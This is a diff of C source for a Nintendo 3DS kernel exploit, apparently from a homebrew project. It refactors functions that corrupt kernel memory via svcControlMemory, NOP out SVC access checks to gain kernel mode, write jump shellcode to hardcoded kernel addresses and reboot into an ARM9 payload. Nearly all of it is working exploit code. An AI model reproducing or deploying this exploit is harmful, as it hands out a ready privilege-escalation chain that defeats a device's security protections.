@@ -24,6 +24,7 @@
 #include <string.h>
 #include <malloc.h>
 #include <dirent.h>
+#include <errno.h>
 #include "arm11.h"
 
 static const int32_t bx_lr = 0xE12FFF1E; // bx lr
@@ -32,7 +33,6 @@ static const int32_t ldr_pc_pc_4 = 0xE51FF004; // ldr pc, [pc, #4]
 
 static u32 nopSlide[0x1000] __attribute__((aligned(0x1000)));
 static const size_t bufSize = 0x10000;
-static int32_t *buf;
 static int32_t *createThreadPatchPtr;
 static int32_t *svcPatchPtr = NULL;
 static int svcIsPatched = 0;
@@ -139,22 +139,8 @@ static int getPatchPtr()
 			printf("Unrecognized kernel version %" PRIx32 ", returning...\n",
 				ver);
 #endif
-			return 1;
+			return -1;
 		}
-}
-
-static inline void CleanAllDcache()
-{
-	__asm__("mov r0, #0\n"
-		"mcr p15, 0, r0, c7, c10, 0\n"
-		::: "r0");
-}
-
-static inline void InvalidateAllIcache()
-{
-	__asm__("mov r0, #0\n"
-		"mcr p15, 0, r0, c7, c5, 0\n"
-		::: "r0");
 }
 
 static int arm11Kxploit()
@@ -162,16 +148,21 @@ static int arm11Kxploit()
 	const size_t allocSize = 0x2000;
 	const size_t freeOffset = 0x1000;
 	const size_t freeSize = allocSize - freeOffset;
-	void *p;
-	void *free;
+	void *p, *free;
+	int32_t *buf;
 	int32_t saved[8];
 	u32 i;
 
-	getPatchPtr();
-#ifdef DEBUG_PROCESS
-	printf("createThread Addr: %p\nSVC Addr: %p\n",
-		createThreadPatchPtr, svcPatchPtr);
-#endif
+	if (createThreadPatchPtr == NULL)
+		return -EFAULT;
+
+	buf = linearMemAlign(bufSize, 0x10000);
+	if (buf == NULL)
+		return -ENOMEM;
+
+	// Wipe memory for debugging purposes
+	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
+		buf[i] = 0xDEADBEEF;
 
 	// Part 1: corrupt kernel memory
 	svcControlMemory((u32 *)&p, 0, 0, allocSize, MEMOP_ALLOC_LINEAR, 0x3);
@@ -229,6 +220,14 @@ static int arm11Kxploit()
 	return 0;
 }
 
+static inline void synci()
+{
+	__asm__("mov r0, #0\n"
+		"mcr p15, 0, r0, c7, c10, 0\n" // Clean Dcache
+		"mcr p15, 0, r0, c7, c5, 0\n" // Invalidate Icache
+		::: "r0");
+}
+
 static void arm9Exploit()
 {
 	int (* const reboot)(int, int, int, int) = (void *)0xFFF748C4;
@@ -256,8 +255,7 @@ static void arm9Exploit()
 	*(int32_t *)0xEFFF497C = ldr_pc_pc_4;
 	*(int32_t *)0xEFFF4980 = 0x1FFF4C84; // arm11Payload + 4
 
-	CleanAllDcache();
-	InvalidateAllIcache();
+	synci();
 
 	reboot(0, 0, 2, 0);
 }
@@ -265,7 +263,6 @@ static void arm9Exploit()
 #ifdef DEBUG_PROCESS
 static void test()
 {
-	buf[0] = 0xFEEFF00F;
 }
 #endif
 
@@ -274,19 +271,17 @@ static void __attribute__((naked)) arm11Kexec()
 
 	__asm__("add sp, sp, #8\n");
 
-	buf[0] = 0xF00FF00F;
-
 	// Fix up memory
-	*(int32_t *)(createThreadPatchPtr+8) = 0x8DD00CE5;
+	createThreadPatchPtr[2] = 0x8DD00CE5;
 
 	// Give us access to all SVCs (including 0x7B, so we can go to kernel mode)
 	if (svcPatchPtr != NULL) {
-		*(int32_t *)(svcPatchPtr) = nop;
-		*(int32_t *)(svcPatchPtr + 8) = nop;
+		svcPatchPtr[0] = nop;
+		svcPatchPtr[2] = nop;
 		svcIsPatched = 1;
 	}
-	InvalidateAllIcache();
-	CleanAllDcache();
+
+	synci();
 
 	arm9Exploit();
 
@@ -316,11 +311,12 @@ int exploit()
 	printf("Exited nop slide\n");
 #endif
 
-	buf = linearMemAlign(bufSize, 0x10000);
-
-	// Wipe memory for debugging purposes
-	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
-		buf[i] = 0xDEADBEEF;
+	if (getPatchPtr())
+		return -1;
+#ifdef DEBUG_PROCESS
+	printf("createThread Addr: %p\nSVC Addr: %p\n",
+		createThreadPatchPtr, svcPatchPtr);
+#endif
 
 	i = arm11Kxploit();
 	if (i)
